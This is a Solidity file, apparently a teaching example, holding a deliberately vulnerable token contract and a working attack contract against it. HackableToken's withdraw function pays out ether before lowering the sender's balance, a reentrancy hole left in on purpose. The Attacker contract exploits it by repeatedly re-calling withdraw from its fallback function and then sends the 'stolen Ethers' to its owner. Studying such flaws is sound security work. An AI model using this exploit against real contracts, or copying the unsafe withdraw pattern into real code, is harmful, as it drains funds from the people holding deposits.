// An ERC20 contract, with a totalSupply of tokens based on ETH deposits.
// There is an issue with this token, which makes it possible for an attacker to 
// withdraw more than they have deposited!

pragma solidity^0.4.0;

contract HackableToken {
    string constant name = "HackableToken";
    string constant symbol = "HKT";
    uint8 constant decimals = 18;
    uint total;

    struct Allowed {
        mapping (address => uint256) _allowed;
    }

    mapping (address => Allowed) allowed;
    mapping (address => uint256) balances;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    function HackableToken() {
        total = 0;
    }

    function totalSupply() constant returns (uint256 totalSupply) {
        return total;
    }

    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner];
    }

    function deposit() payable returns (bool success) {
        if (balances[msg.sender] + msg.value < msg.value) return false;
        if (total + msg.value < msg.value) return false;
        balances[msg.sender] += msg.value;
        total += msg.value;
        return true;
    }

    function withdraw(uint256 _value) payable returns (bool success) {
        if (balances[msg.sender] < _value) return false;
        msg.sender.call.value(_value)();
        balances[msg.sender] -= _value;
        total -= _value;
        return true;
    }

    function transfer(address _to, uint256 _value) returns (bool success) {
        if (balances[msg.sender] < _value) return false;

        if (balances[_to] + _value < _value) return false;
        balances[msg.sender] -= _value;
        balances[_to] += _value;

        Transfer(msg.sender, _to, _value);
       
        return true;
    } 


    function approve(address _spender, uint256 _value) returns (bool success) {
        allowed[msg.sender]._allowed[_spender] = _value; 
        Approval(msg.sender, _spender, _value);
        return true;    
    }

    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
        return allowed[_owner]._allowed[_spender];
    }

    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        if (balances[_from] < _value) return false;
        if ( allowed[_from]._allowed[msg.sender] < _value) return false;
        if (balances[_to] + _value < _value) return false;

        balances[_from] -= _value;
        balances[_to] += _value;
        allowed[_from]._allowed[msg.sender] -= _value;
        return true;
    }

}

/**
 * @title Attacker
 * @dev Contract to attack the HackableToken contract
 */
contract Attacker {
    
    HackableToken hackableToken;
    
    address owner;
    
    /**
    * @dev Modifier to validate the owner
    */
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    /**
    * @dev The Attacker constructor creates the hackable token contract instance
    * and sets the owner address.
    */
    function Attacker(address _hackableToken) public {
        hackableToken = HackableToken(_hackableToken);
        owner = msg.sender;
    }
    
    /**
    * @dev Payable function to initiate the attack
    */
    function getJackpot() public payable {
        hackableToken.deposit.value(msg.value)();
        hackableToken.withdraw(msg.value);
    }
  
    /**
    * @dev Fallback function to make recursive calls
    */
    function () public payable {
        if (address(hackableToken).balance >= msg.value) {
            hackableToken.withdraw(msg.value);
        }
    }
    
    /**
    * @dev Function to withdraw the stolen Ethers
    */
    function withdrawJackpot() onlyOwner public {
        address(msg.sender).transfer(address(this).balance);
    }
}